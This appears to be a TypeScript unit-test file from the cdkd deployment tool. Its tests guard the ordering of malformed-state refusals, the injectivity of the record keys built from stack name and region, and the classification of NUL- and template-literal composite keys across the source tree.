      `${ORPHAN} refuses BELOW its dry-run return, so 'cdkd orphan --dry-run' prints a plan over ` +
        `a record the real run refuses — the worst arm of all.`
    ).toBeLessThan(dryRunAt);
    // (a) A read added ABOVE the guard. Anchoring on the FIRST
    // `rewriteResourceReferences(` only says the guard precedes THAT one; the
    // calculator fence one describe up carries the same arm for the same
    // reason. There is one call site today, so this is a floor against a
    // second appearing above the guard rather than a live discriminator.
    const everyRewrite = [...src.matchAll(/rewriteResourceReferences\(/g)].map((m) => m.index ?? -1);
    expect(
      everyRewrite.length,
      `${ORPHAN} no longer calls rewriteResourceReferences; this fence reads nothing.`
    ).toBeGreaterThanOrEqual(1);
    expect(
      Math.min(...everyRewrite),
      `${ORPHAN} carries the record into a rewrite BEFORE the refusal. A call added above the ` +
        `guard is the same defect one line earlier.`
    ).toBeGreaterThan(refusalAt);
    // SCOPED to the survivors. Without the orphan set the guard refuses the
    // one command that repairs the record — `cdkd orphan` over the damaged
    // resource itself — which is the recovery path #3202 requires it to keep.
    const call = src.slice(refusalAt, src.indexOf(');', refusalAt));
    expect(
      call,
      `${ORPHAN} no longer passes the orphan set, so the refusal names records this run is ` +
        `DELETING and closes the per-resource way out of a torn record.`
    ).toContain('orphanLogicalIds');
    // And the identity is the CALLER's, not the record's own self-report.
    expect(call).toContain('stackInfo.stackName');
    // The region the record is LISTED under, not the one it was loaded with:
    // the remedy commands select by the listing, and for a legacy record with
    // no body region the loaded one is the synthesized region, which selects
    // nothing there (go-to-k/cdkd#3359).
    expect(call).toContain('recordRegion');
    expect(call).not.toContain('targetRegion');
    // And the account / bucket qualification, so the pasted remedy resolves
    // THIS bucket rather than the ambient profile's (go-to-k/cdkd#3363, m2).
    expect(call).toContain('recovery');
    expect(
      call,
      `${ORPHAN} passes the record's own unvalidated identity; a planted pair names a ` +
        `different, healthy stack in the remedy.`
    ).not.toContain('state.stackName');
  });
});

describe('producerRecordKey is injective over (stack, region) — go-to-k/cdkd#3308', () => {
  const NUL = String.fromCharCode(0);

  it('two DISTINCT records cannot share a key, which a separator cannot promise', () => {
    // The exact pair a NUL SEPARATOR collides, measured before the fix. A stack
    // name is read out of an S3 key and is as attacker-chosen as the `outputs`
    // bag, so it can carry the separator itself — whichever record is warned
    // about second was then silently not warned about at all.
    const a = producerRecordKey(`Evil${NUL}us-east-1`, 'ap-northeast-1');
    const b = producerRecordKey('Evil', `us-east-1${NUL}ap-northeast-1`);
    expect(a).not.toBe(b);
    // The control, and it has to build the naive key to mean anything. An
    // earlier revision asserted `expect(X).toBe(X)` — a tautology that proved
    // the pair collides under NOTHING, so the case above could have been
    // satisfied by any key at all.
    const naive = (s: string, r: string): string => `${s}${NUL}${r}`;
    expect(
      naive(`Evil${NUL}us-east-1`, 'ap-northeast-1'),
      'precondition: this pair is one a SEPARATOR collides'
    ).toBe(naive('Evil', `us-east-1${NUL}ap-northeast-1`));
  });

  it('a PRINTABLE separator is refused too, not just the NUL one', () => {
    // Issue go-to-k/cdkd#3308 asks for a case that fails on every separator
    // spelling, and the first revision of this fence did not deliver it:
    // `producerRecordKey = `${s}:${r}`` passed all of it. `:` is not a
    // hypothetical — `secret-redaction.ts` documents it as occurring in real
    // export names — so the encoded key has to beat that spelling as well.
    for (const sep of [':', '@', '|', '/', ' ']) {
      const naive = (s: string, r: string): string => `${s}${sep}${r}`;
      const a: [string, string] = [`Evil${sep}us-east-1`, 'ap-northeast-1'];
      const b: [string, string] = ['Evil', `us-east-1${sep}ap-northeast-1`];
      expect(naive(...a), `precondition: ${sep} collides this pair`).toBe(naive(...b));
      expect(
        producerRecordKey(...a),
        `the encoded key collided under the ${sep} spelling`
      ).not.toBe(producerRecordKey(...b));
    }
  });

  it('the SAME record produces the same key, or the dedup stops deduping', () => {
    expect(producerRecordKey('Producer', 'us-east-1')).toBe(
      producerRecordKey('Producer', 'us-east-1')
    );
    // And a genuinely different record still differs — the other direction,
    // without which "never collides" is satisfied by a key that is always
    // unique and therefore never dedups.
    expect(producerRecordKey('Producer', 'us-east-1')).not.toBe(
      producerRecordKey('Producer', 'us-west-2')
    );
  });

  /**
   * Every file that identifies a state record by `(stackName, region)`, with
   * how many such keys it builds.
   *
   * The COUNT is the half that matters. The previous revision of this fence
   * asserted only `toContain('producerRecordKey(')` per file, which goes green
   * the moment ONE key in a file uses the helper however many separators remain
   * beside it — the same per-FILE shape that let three raw reads ship green on
   * go-to-k/cdkd#3331. `s3-state-backend.ts` builds two, in sibling branches of
   * one loop, and is exactly the file that shape would have half-covered.
   */
  const RECORD_KEY_SITES: ReadonlyArray<readonly [string, number]> = [
    // 2 record keys (the warned-once set, the cross-stack read memoizer) plus
    // 3 coordinate keys (the chain walk's seed, its hop dedupe, its verdict
    // cache) — all five through this module, so one count covers the file.
    ['src/cli/commands/scrub.ts', 5],
    ['src/cli/commands/local-state-loader.ts', 1],
    ['src/state/s3-state-backend.ts', 2],
    ['src/cli/commands/state.ts', 1],
    ['src/cli/commands/state-list-tree.ts', 1],
    ['src/cli/commands/rollback.ts', 1],
  ];

  it('ONE spelling: every record-key site calls this helper, for EVERY key it builds', () => {
    // A second spelling is the failure this helper exists to prevent, and
    // nothing else watches it — the sites are in different files and a reviewer
    // comparing them by eye is what the first round relied on.
    const root = join(dirname(fileURLToPath(import.meta.url)), '..', '..', '..');
    for (const [rel, expected] of RECORD_KEY_SITES) {
      const src = readFileSync(join(root, rel), 'utf-8');
      // BOTH exported wrappers count. They are two names over one private
      // encoding, so a site is covered whichever it uses, and counting only
      // one of them would have read `scrub.ts` as 2-of-5 covered.
      const calls =
        src.split('producerRecordKey(').length -
        1 +
        (src.split('producerCoordinateKey(').length - 1);
      // The import lines and any `{@link ...}` reference in a comment are not
      // calls; requiring AT LEAST the expected count keeps this from being a
      // trip-wire on an added doc mention, while still failing when a site is
      // removed or a new key is built with a separator.
      expect(
        calls,
        `${rel} should build all ${expected} of its record keys through the shared helper`
      ).toBeGreaterThanOrEqual(expected);
    }
  });

  it('no record-key site still JOINS two interpolations with a NUL', () => {
    // The mutation the count above cannot catch: ADDING a third key beside two
    // correct ones, or reverting one of them. A count knows nothing about a
    // site that did not exist when the count was written.
    //
    // Scoped to the NUL spellings deliberately, and this is the fence's LIMIT
    // rather than an oversight. A printable separator cannot be searched for
    // the same way here: `s3-state-backend.ts` legitimately joins
    // interpolations with `/` and `:` to build S3 keys and ARNs, so a pattern
    // wide enough to catch `${a}:${b}` as a record key reddens on healthy
    // code. What covers that direction instead is the helper's own injectivity
    // case above, which fails for EVERY separator spelling including `:`.
    const root = join(dirname(fileURLToPath(import.meta.url)), '..', '..', '..');
    // `String.fromCharCode(0)` so this file carries no raw control byte of its
    // own; the other two are how a TypeScript source spells one.
    const nulSpellings = [String.fromCharCode(0), String.raw`\u0000`, String.raw`\0`];
    for (const [rel] of RECORD_KEY_SITES) {
      const src = readFileSync(join(root, rel), 'utf-8');
      for (const nul of nulSpellings) {
        // `}<NUL>${` — the tail of one interpolation, the separator, the head
        // of the next. Identifier-agnostic, so renaming `stackName` does not
        // silently retire this.
        const pattern = `}${nul}\${`;
        expect(
          src.includes(pattern),
          `${rel} joins two interpolations with a NUL instead of the shared helper`
        ).toBe(false);
      }
    }
  });

  /**
   * Every NUL-joined interpolation pair left anywhere in `src/`, each with the
   * reason it is not a record key.
   *
   * **This list exists because the list above was built by grepping ONE
   * spelling.** The first sweep for go-to-k/cdkd#3323 searched only the
   * backslash-u escaped form and concluded the population was five sites. The
   * three backslash-zero spelled record keys in `state.ts`,
   * `state-list-tree.ts` and `rollback.ts` were the same class, in files the
   * issue never named, and a review round found them. A per-file list cannot
   * catch that — only a sweep of the whole tree can, so the fence below walks
   * `src/` and requires every hit to be accounted for here. Adding a NUL-joined
   * key anywhere now fails until someone writes down what it is.
   *
   * Nothing listed here is a `(stack, region)` or `(stack, export)` identity.
   * The rows naming an issue are tracked there and are NOT exempt on merit.
   */
  /**
   * Every NUL-separated composite key left anywhere in `src/`, with how many
   * NUL OCCURRENCES that file carries and why none of them is a record
   * identity that this PR's helpers should own.
   *
   * **The COUNT is here for the same reason it is on `RECORD_KEY_SITES`.** A
   * per-FILE exemption is the shape this fence's own preamble condemns: it
   * exempts a whole file, so a NEW producer-identity key added beside an
   * exempt one goes green — and the three files carrying the most
   * cross-stack machinery are exactly the exempt ones. With a count, adding
   * any key to an exempt file fails until someone classifies it.
   *
   * **The reasons are phrased as what is CHECKED, not as what a value is
   * expected to be**, after a round where three of them were wrong in that
   * exact way. "CFn logical ids are alphanumeric" was one: `state.ts` says in
   * cdkd's own words that "nothing enforces that constraint HERE — state is
   * read as an unchecked cast", so a rule about what CloudFormation accepts is
   * not a rule about what reaches this code.
   */
  const NUL_JOINS_THAT_ARE_NOT_RECORD_KEYS: ReadonlyArray<readonly [string, number, string]> = [
    [
      'src/deployment/deploy-engine.ts',
      7,
      'the cross-stack 3-part keys, (logicalId, physicalId), and one COMMENT quoting ' +
        'the key shape. HELD by open PRs at the time of go-to-k/cdkd#3496 — this is ' +
        'a WAIT, not a verdict, and the rows are still open there',
    ],
    [
      'src/deployment/secret-redaction.ts',
      4,
      'maskedOutputKey, CROSS_STACK_KEY_SEPARATOR and UNKNOWN_PART_PLACEHOLDER (a ' +
        'SENTINEL, not a separator). LEFT SEPARATED DELIBERATELY: this module imports ' +
        'NOTHING by a recorded decision, the encoding lives in a module it would have ' +
        'to import, and the collision adds no reach — whoever can forge such a ' +
        'coordinate can aim the real one. Its two FALSE justifications are fixed; see ' +
        'go-to-k/cdkd#3496',
    ],
    [
      'src/provisioning/providers/efs-provider.ts',
      1,
      'join() over elements ALREADY through JSON.stringify, which escapes every ' +
        'character below 0x20 — so no element can carry a raw NUL and the join IS ' +
        'injective. That clause is the whole justification: the digest becomes an EFS ' +
        'CreationToken, a creation-idempotency identity, so dropping the .map() would ' +
        'leave a real identity key with no argument behind it',
    ],
    [
      'src/provisioning/providers/idempotency-token.ts',
      2,
      'the DIGEST input, where the separator is domain separation rather than ' +
        'identity — and injective since go-to-k/cdkd#3496, because the `key` half is ' +
        'now JSON-encoded and JSON escapes a NUL to text, so no component can carry ' +
        'the separator. The memo key on the same file is encoded',
    ],
  ];

  it('every NUL-joined interpolation anywhere in src/ is a record key or accounted for', () => {
    const root = join(dirname(fileURLToPath(import.meta.url)), '..', '..', '..');
    // The two needles are BUILT from char codes rather than written as escapes,
    // so this file carries no NUL escape of its own to be mis-edited — and so
    // that what is searched for is unmistakably the SOURCE TEXT a TypeScript
    // file spells a NUL with, not a NUL byte.
    const BACKSLASH = String.fromCharCode(92);
    const U = BACKSLASH + 'u0000';
    const Z = BACKSLASH + '0';
    // THREE shapes, not one. A round found the first revision searching only
    // the template-literal form while `.join(NUL)` and a named separator
    // constant were both already in the tree — the same "one spelling" miss
    // this fence exists for, one level up.
    const needles = [
      '}' + U + '${', // `${a}<NUL>${b}` in a template literal
      '}' + Z + '${',
      ".join('" + U + "')", // [a, b].join(NUL)
      ".join('" + Z + "')",
      "= '" + U + "'", // const SEP = NUL
      "= '" + Z + "'",
    ];
    // Stated limits, since a fence that overstates its reach is worse than a
    // narrow one. A named separator constant is caught at its DECLARATION, not
    // at its uses, so the file is flagged but its call count is not — that is
    // enough for this fence's job, which is to make sure no FILE holding such
    // a key is unclassified. A comment QUOTING a key shape counts as a hit;
    // that is deliberate, since a stale comment asserting an old spelling is
    // itself a defect this PR had to fix twice. And a separator that is
    // neither a NUL nor a named NUL constant is out of scope here — the
    // helper's own injectivity case is what covers those.
    // `git grep -l` over the whole tree, not a hand-walked list: the point is
    // that no file can be outside the sweep. BOTH spellings, since searching
    // one is the mistake this fence exists to make unrepeatable.
    // `git grep -l` FINDS the files; the counting is done here, over the file
    // contents, because it must count OCCURRENCES and `git grep -c` counts
    // matching LINES. That distinction is not academic: `idempotency-token.ts`
    // has FIVE separators on one line, so appending a seventh component to that
    // key — a new attacker-influenced half of a live identity — would leave a
    // line count unchanged, and this fence would wave it through while its own
    // failure message said "a new composite key was added here".
    const listed = new Set<string>();
    for (const needle of needles) {
      let out: string;
      try {
        out = execFileSync('git', ['grep', '-l', '-F', '-e', needle, '--', 'src/'], {
          cwd: root,
          encoding: 'utf-8',
        });
      } catch {
        // `git grep` exits 1 when a needle matches nothing. That is an ordinary
        // outcome for one needle of six, not a failure of the sweep.
        continue;
      }
      for (const f of out.split('\n').filter(Boolean)) listed.add(f);
    }
    const counts = new Map<string, number>();
    for (const rel of listed) {
      const src = readFileSync(join(root, rel), 'utf-8');
      let n = 0;
      for (const needle of needles) n += src.split(needle).length - 1;
      counts.set(rel, n);
    }
    const found = [...counts.keys()].sort();

    // The sweep must actually SEE the tree, or an argv typo silently exempts
    // it. `git grep -l` matching NOTHING exits 1 and `execFileSync` throws,
    // but a needle matching one stray file would not.
    //
    // The floor is the EXEMPTION LIST's own length rather than a number typed
    // in. A literal floor is wrong the moment the population shrinks, which is
    // the direction this work moves it: go-to-k/cdkd#3496 took the tree from
    // nine files to four and a hardcoded `> 5` reddened on the SUCCESS.
    //
    // It is kept as a DISTINCT, EARLIER assertion even though the per-file
    // exact-count loop below implies it, because the two fail with different
    // messages and this one is the readable failure for the case it exists for
    // — an argv typo that empties the sweep. Reaching the loop first would
    // report nine separate "the tree disagrees" lines for one broken needle.
    // It cannot fail alone; that is the point, not an oversight.
    expect(
      found.length,
      'the git grep sweep found fewer files than are exempted — check its needles'
    ).toBeGreaterThanOrEqual(NUL_JOINS_THAT_ARE_NOT_RECORD_KEYS.length);

    const accounted = new Set([
      ...RECORD_KEY_SITES.map(([rel]) => rel),
      ...NUL_JOINS_THAT_ARE_NOT_RECORD_KEYS.map(([rel]) => rel),
    ]);
    expect(
      found.filter((f) => !accounted.has(f)),
      'a NUL-joined interpolation pair appeared in a file this fence does not know about. ' +
        'If it identifies a record or a producer coordinate, route it through ' +
        'producerRecordKey / producerCoordinateKey; otherwise add it to ' +
        'NUL_JOINS_THAT_ARE_NOT_RECORD_KEYS with the reason.'
    ).toEqual([]);

    // Every accounted-as-not-a-record file must still BE a hit, AT THE
    // RECORDED COUNT. An entry that outlives its code makes the list folklore;
    // a file that GAINED a key is a new composite key nobody classified, which
    // is the case a per-file exemption cannot see.
    for (const [rel, expectedCount] of NUL_JOINS_THAT_ARE_NOT_RECORD_KEYS) {
      expect(
        counts.get(rel),
        `${rel} is listed with ${expectedCount} non-record NUL occurrences but the tree ` +
          'disagrees. A HIGHER count means a new separator was added here — classify it, and if it ' +
          'identifies a record or a producer coordinate route it through the shared helper. ' +
          'A LOWER one means this entry outlived its code; remove it.'
      ).toBe(expectedCount);
    }
  });

  /**
   * Every multi-part key expression in `src/` built as a TEMPLATE LITERAL
   * rather than through the shared helper, with the reason each is safe.
   *
   * **This sweep exists because the NUL sweep has a blind spot its own comment
   * admits, and that blind spot shipped a defect.** go-to-k/cdkd#3496's first
   * cut encoded three provider caches whose separator was `:` — invisible to a
   * NUL search — and worse, it moved the key while leaving a READER of the old
   * spelling: `invalidateAttributeCache` scanned for `<physicalId>:` and after
   * the change matched nothing, so every post-update `Fn::GetAtt` read the
   * pre-update value. Silent: no test covered it and every gate stayed green.
   *
   * So this one keys on the SHAPE a composite key has — two or more
   * interpolations in one template literal, used as a Map/Set key or bound to
   * a `*Key` name — rather than on the separator, which is the thing that
   * varies.
   *
   * **It would NOT have caught the defect that motivated it, and saying so is
   * the point.** A READER that re-spells a key —
   * `key.startsWith(`${physicalId}:`)` — has ONE interpolation, so no
   * key-shape rule sees it. What covers that is the behavioural eviction cases
   * in `tests/unit/state/composite-key-collisions.test.ts` and, structurally,
   * `injectiveKeyPrefix` existing at all so a reader has nothing to re-spell.
   * This fence catches the WRITE side; nothing mechanical catches the read
   * side.
   *
   * Further residuals: `+` concatenation, `.join('<printable>')`, a separator
   * held in a variable, and a key built over several statements.
   */
  const TEMPLATE_KEY_EXPRESSIONS: ReadonlyArray<readonly [string, number, string]> = [
    // --- arm A: a template literal passed straight to .get/.set/.has/.add ---
    [
      'src/cli/commands/drift.ts',
      2,
      'sets of RENDERED report paths; nothing is SERVED by these, they only ' +
        'deduplicate what is printed',
    ],
    [
      'src/provisioning/property-coverage.ts',
      2,
      '`${resourceType}:${property}` membership in the ' +
        '--allow-unsupported-properties set; the property half comes from the ' +
        'GENERATED drop table, a closed set',
    ],
    [
      'src/provisioning/provider-registry.ts',
      3,
      ':842 / :893 are the closed-set membership test above. :1049 is NOT -- its ' +
        'property half is `findUnrecognizedProperties`, i.e. TEMPLATE-declared names, ' +
        'an open set. What holds there is the other half: a collision needs a ' +
        'REGISTERED resourceType that is a `:`-delimited proper prefix of another, ' +
        'and no registered type is a prefix of a registered type',
    ],
    [
      'src/provisioning/providers/sns-topic-provider.ts',
      1,
      '`${protocol}${suffix}`; `normalizeDeliveryStatusProtocol` returns a closed set ' +
        'or the loop continues, and the suffixes are three literals',
    ],
    // --- arm B: a template literal bound to a `*Key` name -------------------
    [
      'src/assets/docker-asset-publisher.ts',
      1,
      'an ECR registry host, and it IS a lookup identity -- `loggedInRegistries` ' +
        'gates whether GetAuthorizationToken + docker login re-run. What makes it ' +
        'safe is neither half: the separator is the multi-character literal ' +
        '`.dkr.ecr.`, so a collision needs one half to contain that whole string. ' +
        '(The region half comes from asset-manifest JSON and is NOT charset-gated ' +
        'here, which an earlier revision of this row claimed.)',
    ],
    [
      'src/cli/upload-cfn-template.ts',
      1,
      'an S3 OBJECT key being written, not a key anything is looked up by',
    ],
    [
      'src/deployment/deploy-engine.ts',
      1,
      'a NUL-joined key, classified in NUL_JOINS_THAT_ARE_NOT_RECORD_KEYS above ' +
        '-- go-to-k/cdkd#3496',
    ],
    [
      'src/deployment/intrinsic-function-resolver.ts',
      1,
      ':6608 `${physicalId}#${attributeName}` INSIDE a switch, so the second half is ' +
        'one of five literals at that point; a closed second half is what makes a ' +
        'separator injective here',
    ],
    [
      'src/deployment/recreate-targets.ts',
      1,
      'the same `${resourceType}:${property}` closed-set membership test',
    ],
    [
      'src/local/ecr-puller.ts',
      1,
      '`${ecrRoleArn}|${region}`; NOTHING validates either half -- the ARN is a raw ' +
        '`--ecr-role-arn` flag and `canonicalizeRegion` only lowercases, which an ' +
        'earlier revision of this row got wrong. What holds is PROVENANCE: both are ' +
        'OPERATOR-supplied, a CLI flag and the local AWS config, so a collision ' +
        'needs the operator to type the separator into their own role ARN',
    ],
    [
      'src/local/httpv2-service-integration.ts',
      1,
      '`${service}:${region}`; `service` is a literal at the call site',
    ],
    [
      'src/synthesis/context-providers/vpc-provider.ts',
      1,
      '`${subnet.type}/${subnet.name}`; the type half is a closed set',
    ],
    [
      'src/utils/proxy-routing-agent.ts',
      1,
      "`${secure ? 'https' : 'http'}|…`; the first half is one of two literals",
    ],
  ];

  /**
   * The two shapes a multi-part key is written in, as POSIX ERE.
   *
   * **POSIX classes, not `\s` / `\w`.** `git grep -E` is POSIX ERE and supports
   * neither, so a pattern using them matches NOTHING and says so with exit 1 —
   * which is indistinguishable from a clean tree unless something checks. An
   * earlier revision of this fence used `\s` and `\w` in arm B: it matched zero
   * files, the list said "eight exist, all listed", and the real population was
   * seventeen. The per-arm floor below is what makes that unrepeatable.
   */
  const KEY_EXPRESSION_ARMS: ReadonlyArray<readonly [string, string, string]> = [
    [
      'passed to .get/.set/.has/.add/.delete',
      '\\.(get|set|has|add|delete)\\(`[^`]*\\$\\{[^`]*\\$\\{',
      'src/provisioning/property-coverage.ts',
    ],
    [
      'bound to a *Key name',
      '(const|let)[[:space:]]+[[:alnum:]_]*[Kk]ey[[:space:]]*=[[:space:]]*`[^`]*\\$\\{[^`]*\\$\\{',
      'src/local/ecr-puller.ts',
    ],
  ];

  it('every template-literal multi-part key expression in src/ is classified', () => {
    const root = join(dirname(fileURLToPath(import.meta.url)), '..', '..', '..');
    const counts = new Map<string, number>();
    for (const [label, pattern, mustMatch] of KEY_EXPRESSION_ARMS) {
      // NO catch. `git grep` exiting 1 means the arm matched nothing, and an
      // arm that matches nothing is a BROKEN arm, not a clean tree — the
      // previous revision swallowed that and went green over nine files.
      const out = execFileSync('git', ['grep', '-c', '-E', pattern, '--', 'src/'], {
        cwd: root,
        encoding: 'utf-8',
      });
      const armFiles = new Map<string, number>();
      for (const line of out.split('\n').filter(Boolean)) {
        const at = line.lastIndexOf(':');
        armFiles.set(line.slice(0, at), Number(line.slice(at + 1)));
      }
      // Guard-the-guard, per ARM: each must still see a file known to carry its
      // shape. A whole-sweep floor cannot catch one arm of two going inert.
      expect(
        armFiles.has(mustMatch),
        `the "${label}" arm no longer matches ${mustMatch}, so it is seeing nothing`
      ).toBe(true);
      for (const [f, n] of armFiles) counts.set(f, (counts.get(f) ?? 0) + n);
    }

    const classified = new Set(TEMPLATE_KEY_EXPRESSIONS.map(([rel]) => rel));
    expect(
      [...counts.keys()].filter((f) => !classified.has(f)).sort(),
      'a multi-part key built as a template literal appeared in a file this fence does ' +
        'not know about. If it identifies something, route it through injectiveKey — and ' +
        'if you MOVE an existing key, find every reader of the old spelling first ' +
        '(go-to-k/cdkd#3496 broke a prefix scan exactly that way). Otherwise add it to ' +
        'TEMPLATE_KEY_EXPRESSIONS with the reason.'
    ).toEqual([]);

    for (const [rel, expected] of TEMPLATE_KEY_EXPRESSIONS) {
      expect(
        counts.get(rel),
        `${rel} is listed with ${expected} template-literal key expressions but the tree disagrees`
      ).toBe(expected);
    }
  });

  it('the NUL fence would FAIL on the code it replaced', () => {
    // Guard-the-guard: the assertion above is an `includes` over a hand-built
    // needle, and a typo in that needle makes it pass over every file forever.
    // Feed it the exact expression `scrub.ts` carried before go-to-k/cdkd#3323.
    const before = 'const key = `${stackName}' + String.raw`\u0000` + '${stateRegion}`;';
    expect(before.includes('}' + String.raw`\u0000` + '${')).toBe(true);
  });
});

describe('a file hosting BOTH a read-only view and a writer refuses per FLOW', () => {
  /**
   * The index immediately AFTER the `}` closing the `{` at `openAt`, by COUNTING
   * braces — an exclusive endpoint, which is what `String.prototype.slice`
   * takes and what both callers pass it.
   *
   * Needed because slicing "from the `else` to the end of the function" is not
   * the else ARM — code after the branch reads as if it were inside it, which
   * is exactly the mutant (repairs moved out of the `else` into an
   * unconditional block) an earlier cut of this fence let through.
   */
  function matchingCloseBrace(src: string, openAt: number): number {
    expect(src[openAt], 'matchingCloseBrace was not given an opening brace').toBe('{');
    let depth = 0;
    for (let i = openAt; i < src.length; i++) {
      if (src[i] === '{') depth++;
      else if (src[i] === '}' && --depth === 0) return i + 1;
    }
    throw new Error('unbalanced braces in the sliced flow');
  }

  /**
   * Slice `src` to the body of the top-level function starting at `anchor`.
   *
   * The end is the next `\n}` at COLUMN ZERO, which for a top-level function
   * declaration is its own closing brace — every brace inside the body is
   * indented. Returning the whole file on a miss would make every assertion
   * below pass for the wrong reason, so the caller asserts the slice is real
   * before reading it.
   */
  function flow(src: string, anchor: string): string {
    const start = src.indexOf(anchor);
    expect(start, `anchor \`${anchor}\` is stale; this fence is slicing nothing`).toBeGreaterThan(
      -1
    );
    const end = src.indexOf('\n}\n', start);
    expect(end, `no column-zero close after \`${anchor}\``).toBeGreaterThan(start);
    return src.slice(start, end);
  }

  it('src/cli/commands/state.ts — refresh-observed refuses both shapes before it reads either', () => {
    const src = code('src/cli/commands/state.ts');
    const body = flow(src, 'async function refreshObservedForStack(');

    // The premise: this flow is the file's writer. If it stops persisting, the
    // classification should be revisited rather than silently inherited.
    expect(body, 'refreshObservedForStack no longer calls saveState').toContain('saveState(');

    const bagRefusal = body.indexOf('refuseMalformedState(');
    const entryRefusal = body.indexOf('refuseMalformedResourceEntries(');
    expect(bagRefusal, 'refreshObservedForStack no longer refuses a malformed BAG').toBeGreaterThan(
      -1
    );
    expect(
      entryRefusal,
      'refreshObservedForStack no longer refuses an unreadable ENTRY, which `refuseMalformedState` ' +
        'does not cover: it tests the bag, so `{"R": null}` passes it.'
    ).toBeGreaterThan(-1);

    // DOMINANCE over the walk AND over the dry-run branch. The dry run has its
    // own loop precisely so it reaches the same verdict in the same order, so a
    // refusal below the branch would let `--dry-run` plan a refresh the real run
    // refuses — the asymmetry issue go-to-k/cdkd#2944 already paid for once.
    const walk = body.indexOf('Object.entries(state.resources');
    const dryRun = body.indexOf('if (opts.dryRun)');
    expect(walk, "refreshObservedForStack's bag walk moved; this anchor is stale").toBeGreaterThan(
      -1
    );
    expect(dryRun, "refreshObservedForStack's dry-run branch moved").toBeGreaterThan(-1);
    expect(Math.max(bagRefusal, entryRefusal)).toBeLessThan(walk);
    expect(Math.max(bagRefusal, entryRefusal)).toBeLessThan(dryRun);

    // NOT pinned here: which of the two refusals comes first. An earlier
    // revision asserted the bag one must, reasoning that the entry helper's
    // `[]` answer for an unreadable bag would otherwise let a string bag reach
    // the walk. That reasoning is wrong — with the order reversed the entry
    // call returns and the bag call still throws, above the walk either way —
    // so the assertion rejected a safe ordering for a failure that cannot
    // happen. The invariant that DOES matter is the composition rule, and it
    // is pinned where it lives: `refuseMalformedResourceEntries stays silent on
    // an unreadable BAG` in this file's helper cases.

    // NEITHER repair helper may be inside this flow, only elsewhere in the file
    // — that is exactly what makes this file mixed rather than wrong. Both, not
    // just the bag one: dropping the unreadable ENTRIES before the save would
    // delete the evidence from the record this flow then persists, which is the
    // same laundering by a narrower door.
    for (const repair of [
      'repairMalformedResourcesForReadOnly',
      'repairMalformedResourceEntriesForReadOnly',
    ]) {
      expect(
        body.includes(repair),
        `refreshObservedForStack calls ${repair} but persists the record.`
      ).toBe(false);
    }
    // The CALL, not the import: `src.includes('repairMalformedResourcesForReadOnly')`
    // matched the import line, so replacing both read-only repair calls with
    // `false` left this premise green and the file no longer mixed at all. The
    // open paren is what the import cannot supply.
    // PER SITE, not a file-wide count: removing the repair from one read-only
    // load site and duplicating it at the other keeps the total at two while
    // the record that site renders goes back to aborting.
    //
    // What this does NOT establish, stated rather than implied: that the call
    // RUNS. A source fence reads text, so `if (false && repair(...))` satisfies
    // it, and no grep can decide reachability. What covers that is behavioural
    // — `tests/unit/cli/state-record-shape.test.ts` drives both of these views
    // over malformed records through the real backend — and this fence's job is
    // the complementary one: that the call is here at all, in this function,
    // and is not the import.
    for (const site of ['async function stateResourcesCommand(', 'function repairRecordForTextRender(']) {
      expect(
        flow(src, site).match(/repairMalformedResourcesForReadOnly\(/g) ?? [],
        `${site} no longer CALLS the read-only repair; if this view stopped needing it, ` +
          'state.ts is no longer mixed and belongs in REFUSE above.'
      ).toHaveLength(1);
    }
    // The file's only LITERAL `saveState` is in this flow, which is the other
    // half of "mixed": a second one elsewhere in the file would be a writer
    // inheriting the read-only repair above it, with nothing here to notice.
    // Deliberately narrower than "state.ts does not write anywhere else" —
    // `cdkd state destroy` writes through `runDestroyForStack`, in another
    // module, and no grep over this file can see that.
    expect(src.match(/saveState\(/g) ?? []).toHaveLength(1);
    expect(body.match(/saveState\(/g) ?? []).toHaveLength(1);
  });

  it('src/cli/commands/drift.ts — the mode decides, and the decision is made beside the flags', () => {
    const src = code('src/cli/commands/drift.ts');
    const body = flow(src, 'async function runDriftForStack(');

    // Both arms present in the one flow: this is the file where the module's
    // two halves meet.
    expect(body).toContain('refuseMalformedState(');
    expect(body).toContain('refuseMalformedResourceEntries(');
    expect(body).toContain('repairMalformedResourcesForReadOnly(');
    expect(body).toContain('repairMalformedResourceEntriesForReadOnly(');

    // DOMINANCE over this flow's first dereference, for all FOUR calls. The bag
    // pair alone is not enough: moving either ENTRY helper below the walk leaves
    // `resource.resourceType` dereferencing an unreadable row exactly as before,
    // and a fence checking only the bag pair reads green through it.
    const walk = body.indexOf('Object.entries(state.resources');
    expect(walk, "runDriftForStack's bag walk moved; this anchor is stale").toBeGreaterThan(-1);
    for (const call of [
      'refuseMalformedState(',
      'refuseMalformedResourceEntries(',
      'repairMalformedResourcesForReadOnly(',
      'repairMalformedResourceEntriesForReadOnly(',
    ]) {
      const at = body.indexOf(call);
      expect(at, `${call} is no longer in runDriftForStack`).toBeGreaterThan(-1);
      expect(at, `${call} now runs AFTER this flow's first bag walk`).toBeLessThan(walk);
    }

    // The mode must be CONSUMED, not merely produced, and the two ARMS must be
    // the ones the mode selects. The call-site assertion below pins the
    // expression that computes it; replacing the branch here with a constant —
    // `if (false)`, or dropping the `else` — leaves that expression untouched
    // and every behavioural case for the surviving arm green.
    //
    // Sliced rather than matched with `[\s\S]*`, which an earlier cut used: that
    // reached an UNRELATED later `else` in the same function, so deleting this
    // branch's own `else` left the fence green.
    const ifAt = body.indexOf("if (malformedRecordMode === 'refuse') {");
    expect(ifAt, 'runDriftForStack no longer branches on the mode it is passed').toBeGreaterThan(
      -1
    );
    // The refuse arm's own closing brace, then its OWN adjacent `else`. An
    // earlier cut took the first `} else {` at or after the `if`, which a
    // `if (mode === 'refuse') {} if (true) {` rewrite satisfies with an
    // UNRELATED branch further down — the repairs would then run in both modes.
    const refuseClose = matchingCloseBrace(body, body.indexOf('{', ifAt));
    expect(
      body.slice(refuseClose - 1).startsWith('} else {'),
      "the refuse arm's own closing brace is no longer followed by its else"
    ).toBe(true);
    const elseAt = refuseClose - 1;
    const refuseArm = body.slice(ifAt, elseAt);
    // The repair arm ends at its own closing brace, found by COUNTING, not at
    // the end of the function: `body.slice(elseAt)` swept up everything after
    // the branch, so moving the repairs OUT of the `else` into an unconditional
    // block below it left this green — and they would then run in refuse mode
    // too, inert only because the refusal threw first.
    const repairArm = body.slice(elseAt, matchingCloseBrace(body, body.indexOf('{', elseAt)));
    // CONFINEMENT, not presence: each call must appear in its own arm and
    // EXACTLY ONCE in the whole flow. Checking the arms alone permits a
    // duplicate immediately after the branch, which runs in both modes — inert
    // today only because the refusal threw first, which is the kind of "inert
    // for now" this fence exists to refuse.
